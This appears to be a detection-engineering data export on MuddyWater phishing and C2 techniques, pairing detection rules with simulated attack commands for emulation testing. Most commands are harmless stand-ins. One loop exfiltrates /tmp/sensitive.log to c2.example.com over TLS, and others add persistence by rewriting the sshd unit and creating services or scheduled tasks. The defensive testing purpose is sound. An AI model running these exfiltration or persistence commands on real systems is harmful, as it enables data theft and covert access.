extracted_ttps.description: MuddyWater uses spear-phishing emails with links to archives hosted on file-sharing platforms to initiate the infection
Detected Phishing activity via NLP pattern matching
PowerShell code is executed on the infected host to establish a connection to a custom C2 server
The decoy document is opened in a new Windows Explorer window to fool the victim
A signed, legitimate installer for Advanced Monitoring Agent is used to execute malicious code
The victim is tricked into opening a LNK file, which initiates the infection

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The infected host beacons to a custom C2 server, potentially exfiltrating data
Detected PowerShell activity via NLP pattern matching
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching
Detected Network Service Discovery activity via NLP pattern matching
Detected Archive Collected Data activity via NLP pattern matching

rules.title: MuddyWater Phishing: Office Application Spawning Command Shell with Malicious ZIP Download
rules.description: Detects Office applications spawning command-line interpreters with command lines referencing known MuddyWater phishing artifacts such as specific .zip files or file-sharing domains.
falsepositives: Users manually launching scripts or command-line tools from within Office documents for legitimate purposes
Automated document processing systems that extract or download content via embedded scripts

rules.title: Detection: Command and Scripting Interpreter
rules.description: PowerShell code is executed on the infected host to establish a connection to a custom C2 server
falsepositives: Legitimate administrative activity

rules.title: Application Window Discovery via Windows Explorer and Decoy Document
rules.description: Detects explorer.exe executing with command line parameters indicative of decoy document execution for Application Window Discovery.
falsepositives: Legitimate administrative scripts using explorer.exe with /root parameter
Manual opening of .lnk files via Windows Explorer

rules.title: Detection: Signed Binary Proxy Execution
rules.description: A signed, legitimate installer for Advanced Monitoring Agent is used to execute malicious code
falsepositives: Legitimate administrative activity

rules.title: Detect Execution of Malicious LNK Shortcut and Diagnostic.exe Payload
rules.description: Detects processes launched with a .lnk file (common LNK handlers) when the parent process is an email client, and also flags execution of Diagnostic.exe, indicating possible user execution of a malicious attachment (T1193, T1204).
falsepositives: Legitimate use of shortcuts (.lnk) launched by administrators or support scripts.
Users manually opening shortcuts from email clients for benign purposes.
Diagnostic.exe executed by IT staff for troubleshooting.

rules.title: Suspicious C2 Client Execution
rules.description: Detects execution of MuddyC2Go or PhonyC2 command and control clients through process names or command-line patterns
falsepositives: Legitimate security research using these tools
Penetration testing activities
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: Detection: PowerShell
rules.description: Detected PowerShell activity via NLP pattern matching
falsepositives: Legitimate administrative activity

rules.title: Suspicious System Process Modification via Service Utilities
rules.description: Detects attempts to create or modify Windows system processes through service control manager and registry utilities with common persistence patterns
falsepositives: Legitimate service installations by system administrators
Software deployment tools modifying registry keys
PowerShell scripts using encoded commands for legitimate purposes

rules.title: Network Service Discovery via Command Line
rules.description: Detects Network Service Discovery activity via command line
falsepositives: Legitimate network scanning by administrators
Penetration testing activities

rules.title: Suspicious Data Archiving Activity
rules.description: Detects processes associated with data archiving spawned by potential LOLBINs
falsepositives: Legitimate system administration activities
Software packaging/installation processes
User-driven compression operations

siem_verification.message: Invalid SPL: Error in 'SearchOperator:regex': Usage: regex <field> (=|!=) <regex>.

attacks.description: Encode a benign command to simulate a malicious payload using Base64 encoding.
attacks.expected_behavior: A file named payload.txt will be created in the %TEMP% directory containing the Base64 encoded command to start notepad.exe.

attacks.description: Decode and execute the simulated malicious payload.
attacks.expected_behavior: Notepad.exe will be launched as a result of executing the decoded command.

attacks.command: cmd.exe /c "echo This is a simulated phishing email > %TEMP%\phishing_email.txt && start %TEMP%\phishing_email.txt"
attacks.description: Simulate receiving a phishing email by creating a local file and opening it.
attacks.expected_behavior: A file named phishing_email.txt will be created in the %TEMP% directory and opened, simulating the action of a user opening an attachment from a phishing email.

attacks.command: echo 'This is a test phishing email.' > phishing_email.txt; zip phishing_archive.zip phishing_email.txt
attacks.description: Create a test phishing email and archive it.
attacks.expected_behavior: A zip archive named phishing_archive.zip is created in the current directory containing a text file named phishing_email.txt.

attacks.description: Create a directory for a test email, add content, and archive it, simulating an intermediate level of complexity.
attacks.expected_behavior: A directory named test_email is created in the user's home directory, containing a zip archive named phishing_archive.zip with a text file named email_content.txt.

attacks.command: tar -czf phishing_archive.tar.gz test_file.txt && base64 phishing_archive.tar.gz > encoded_archive.txt
attacks.description: Create a tarball of a test file, encode it with base64, and save it to a text file, demonstrating an advanced scenario.
attacks.expected_behavior: A tarball named phishing_archive.tar.gz is created and then encoded with base64, with the encoded data saved to a text file named encoded_archive.txt.

attacks.description: Basic command to simulate a C2 connection using PowerShell.
attacks.expected_behavior: Executes a PowerShell command that simulates establishing a connection to a C2 server without actually connecting.

attacks.description: Intermediate command that uses PowerShell to simulate downloading a file from a 'C2 server' (actually a local file) and saving it to the temp directory.
attacks.expected_behavior: Downloads a simulated C2 server response to a local file without actually accessing the internet.

attacks.command: powershell -Command "& {Add-Type -AssemblyName System.Net.Sockets; $sock = New-Object System.Net.Sockets.Socket('InterNetwork', 'Stream', 'Tcp'); $sock.Connect('127.0.0.1', 8080); $sock.Send([Text.Encoding]::ASCII.GetBytes('Simulated C2 Connection'))}"
attacks.description: Advanced command that uses PowerShell to establish a socket connection to a local endpoint, simulating a C2 connection.
attacks.expected_behavior: Establishes a local socket connection and sends a simulated C2 connection message.

attacks.description: Basic command to test PowerShell execution on Linux, printing 'Hello, World!' to the console.
attacks.expected_behavior: Prints 'Hello, World!' to the console, demonstrating basic PowerShell execution.

attacks.description: Intermediate command attempting to establish a TCP connection to a benign server, then closing it, simulating C2 communication.
attacks.expected_behavior: Attempts to connect to 'example.com' on port 80, then closes the connection, demonstrating network interaction capabilities.

attacks.description: Advanced command creating a file named 'test.txt' with specified content, demonstrating file system interaction.
attacks.expected_behavior: Creates 'test.txt' in the current directory with the content 'This is a test.', showing file creation capabilities.

attacks.description: Lists all running applications and services, demonstrating basic application window discovery.
attacks.expected_behavior: Displays a list of running applications and services in the command prompt window.

attacks.description: Uses PowerShell to get a list of processes with a main window title, simulating the discovery of application windows with titles.
attacks.expected_behavior: Lists the titles of application windows in the PowerShell console.

attacks.command: powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; Add-Type -AssemblyName System.Windows.Forms; [Microsoft.VisualBasic.Interaction]::Shell("cmd.exe /c start notepad.exe", Microsoft.VisualBasic.AppWinStyle.NormalFocus, false, -1)"
attacks.description: Opens a new Notepad window using PowerShell, demonstrating the creation of a new application window.
attacks.expected_behavior: A new Notepad window appears on the desktop.

attacks.description: Lists all open windows in a hierarchical tree format starting from the root window using X11
attacks.expected_behavior: Outputs a tree of all top-level and child windows currently managed by the X server, including window titles and IDs

attacks.description: Lists all open windows with their titles and window IDs using wmctrl
attacks.expected_behavior: Prints a list of currently open windows, showing window ID, desktop number, and title

attacks.description: Queries the X11 root window property _NET_CLIENT_LIST to get IDs of all client windows
attacks.expected_behavior: Returns a list of window identifiers for all managed client windows, which can be further queried for details

attacks.description: Download a legitimate-looking monitoring agent installer and execute it silently to proxy malicious installation
attacks.expected_behavior: Downloads a binary from a local server (simulated) to the temp directory and executes it with silent install flags, simulating abuse of a signed installer for code execution

attacks.description: Download and execute a secondary script, then use signed agent installer to load a DLL under elevated context
attacks.expected_behavior: Downloads a PowerShell script to memory, then attempts to launch the signed installer with arguments that may trigger DLL loading or execution chaining, requiring elevation via RunAs

attacks.command: cmd.exe /c "echo [MSI Package Simulation] > %TEMP%\advmonagent.exe && echo payload_stub >> %TEMP%\advmonagent.exe && start /b %TEMP%\advmonagent.exe /q /norestart"
attacks.description: Simulate execution of a signed installer by creating a fake binary and launching it with quiet install flags
attacks.expected_behavior: Creates a dummy installer file and executes it with common silent switches, simulating abuse of installer trust without actual payload delivery

attacks.description: Using curl to download a benign payload and execute it with bash
attacks.expected_behavior: The benign payload will be downloaded and executed, demonstrating the technique without causing harm

attacks.description: Using bash to create and execute a benign payload
attacks.expected_behavior: The benign payload will be created and executed, demonstrating the technique without causing harm

attacks.description: Using sudo and bash to create and execute a benign payload in a system directory
attacks.expected_behavior: The benign payload will be created and executed in a system directory, demonstrating the technique with elevated privileges

attacks.description: Basic command that creates a file with a malicious payload using bash
attacks.expected_behavior: Creates a file named malicious.txt in the user's home directory with the content 'Malicious payload'

attacks.description: Intermediate command that creates a file with a malicious payload and then reads its content
attacks.expected_behavior: Creates a file named malicious.txt in the user's home directory with the content 'Malicious payload' and then prints the content to the console

attacks.description: Advanced command that creates a file with a malicious payload, makes it executable, and then executes it
attacks.expected_behavior: Creates a file named malicious.txt in the user's home directory with the content 'Malicious payload', makes it executable, and then executes it

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Basic exfiltration: sends the contents of a test file to a C2 server via an HTTP POST request.
attacks.expected_behavior: The C2 server receives the raw file data as the body of the HTTP request.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate exfiltration: compresses the system log and streams it to a C2 listener using netcat.
attacks.expected_behavior: The remote netcat listener receives a gzipped archive containing the syslog file.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: while true; do cat /tmp/sensitive.log | openssl s_client -quiet -connect c2.example.com:8443; sleep 300; done &
attacks.description: Advanced exfiltration: continuously reads a log file and sends its contents over an encrypted TLS channel to the C2 server, sleeping 5 minutes between transmissions.
attacks.expected_behavior: The C2 server receives the file data over a TLS‑encrypted connection each cycle, allowing covert, periodic exfiltration.

attacks.description: Executes a simple PowerShell command that outputs a test string to the console.
attacks.expected_behavior: Displays the text 'PowerShell basic test' in the console.

attacks.description: Creates a temporary text file with sample content and then reads it back.
attacks.expected_behavior: A file named testfile.txt is written to the user's TEMP directory containing 'Test content', and the same content is printed to the console.

attacks.command: powershell -NoProfile -Command "schtasks /Create /SC ONCE /TN TestTask /TR \`"cmd.exe /c echo Advanced > $env:TEMP\\advanced.txt\`" /ST 00:00 /RL HIGHEST"
attacks.description: Uses PowerShell to invoke schtasks.exe and create a one‑time scheduled task that writes a file to the TEMP directory.
attacks.expected_behavior: A scheduled task named 'TestTask' is created; when triggered it runs cmd.exe to write the string 'Advanced' into advanced.txt in the TEMP folder. The task requires highest privileges, so admin rights are needed.

attacks.description: Basic file download using PowerShell Core
attacks.expected_behavior: Downloads example.com/test.txt to /tmp/ps_test1.txt using native PowerShell cmdlet

attacks.description: Intermediate encoded command download
attacks.expected_behavior: Executes base64-encoded command to download test2.txt from example.com to /tmp (UTF-16LE encoded)

attacks.description: Advanced process execution via PowerShell
attacks.expected_behavior: Creates /tmp/ps_advanced.txt via shell process spawned from PowerShell with proper argument escaping

attacks.command: sc.exe create TestService binPath= "%TEMP%\test.exe" start= auto
attacks.description: Creates a new auto-start service pointing to a benign TEMP executable
attacks.expected_behavior: Service 'TestService' is created with auto-start type. Fails to start due to missing executable, but demonstrates service creation for persistence.

attacks.description: Modifies Windows Search service to execute a benign TEMP file
attacks.expected_behavior: Service binary path updated. Service restart would attempt to execute non-existent file, demonstrating configuration modification.

attacks.description: Creates SYSTEM-level scheduled task for persistence on startup
attacks.expected_behavior: Scheduled task created to run a benign batch file as SYSTEM during system startup.

attacks.description: Adds a user‑level cron job that creates a test file every 5 minutes, providing persistence without needing admin rights.
attacks.expected_behavior: The current user's crontab is updated; cron will execute the touch command every 5 minutes, creating ~/.testfile.

attacks.command:
sudo bash -c 'cat <<EOF > /etc/systemd/system/testpersist.service
[Unit]
Description=Test Persistence Service

[Service]
ExecStart=/usr/bin/touch /tmp/persist_test

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable testpersist.service
systemctl start testpersist.service'
attacks.description: Creates a new systemd service that runs a benign command, enables it for boot, and starts it immediately, demonstrating persistence via a custom service.
attacks.expected_behavior: A service file is written to /etc/systemd/system, systemd reloads its configuration, the service is enabled to start at boot, and it runs immediately creating /tmp/persist_test.

attacks.command:
sudo bash -c 'systemctl edit sshd.service --full - <<EOF
[Unit]
Description=Secure Shell Daemon

[Service]
ExecStart=/usr/sbin/sshd -D
ExecStartPost=/usr/bin/touch /tmp/sshd_modified

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl restart sshd.service'
attacks.description: Edits the existing sshd systemd unit to add an ExecStartPost hook that creates a file, showing how an attacker can modify a legitimate service for persistence.
attacks.expected_behavior: The sshd.service unit file is overwritten with an added ExecStartPost line; systemd reloads the unit and restarts sshd, causing /tmp/sshd_modified to be created each time sshd starts.

attacks.description: Enumerate network shares and domain computers
attacks.expected_behavior: Lists all network shares and computers in the current domain. Output shows server names and shared resources.

attacks.description: List active network connections and listening ports
attacks.expected_behavior: Displays all active TCP/UDP connections with process IDs (PID). Shows local/foreign addresses and connection states.

attacks.command: powershell -Command "Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State; Get-SmbMapping"
attacks.description: Advanced service discovery via PowerShell TCP/SMB enumeration
attacks.expected_behavior: Enumerates active TCP connections (including listening ports) and mapped SMB shares. Output includes IP addresses, ports, and share paths.

attacks.description: List all listening ports and associated programs using netstat
attacks.expected_behavior: Displays a list of all listening ports, the programs using them, and their PIDs

attacks.description: Perform a TCP connect scan on the local machine to discover open ports
attacks.expected_behavior: Scans and lists open ports on the localhost, indicating potential services

attacks.description: Perform a UDP scan on the local machine to discover open UDP ports
attacks.expected_behavior: Scans and lists open UDP ports on the localhost, which can be useful for service discovery

attacks.description: Basic file archiving using makecab utility
attacks.expected_behavior: Creates CAB archive of sample.txt from %TEMP% directory into collected_data.cab

attacks.description: Intermediate PowerShell log archiving
attacks.expected_behavior: Compresses all .log files from AppData into logs.zip in TEMP directory, overwriting existing

attacks.description: Advanced collection/archiving with cleanup
attacks.expected_behavior: Copies DOCX files to temp directory, archives to CAB, then deletes temp files. Silent error handling for cleanup

attacks.description: Create a gzip‑compressed tar archive of all .txt files in the user's Documents directory.
attacks.expected_behavior: A file named collected_data.tar.gz is created in /tmp containing the selected text files.

attacks.description: Create a password‑protected zip archive of critical system log files.
attacks.expected_behavior: A zip file named collected_data.zip is created in /tmp; it contains syslog and auth.log encrypted with the provided password.

attacks.description: Archive SSH configuration files, compress the stream, and split the resulting archive into 1 MiB chunks.
attacks.expected_behavior: A compressed archive ssh_config.tar.gz is created in /tmp, then split into multiple files named ssh_config_part_aa, ssh_config_part_ab, etc., each up to 1 MiB.
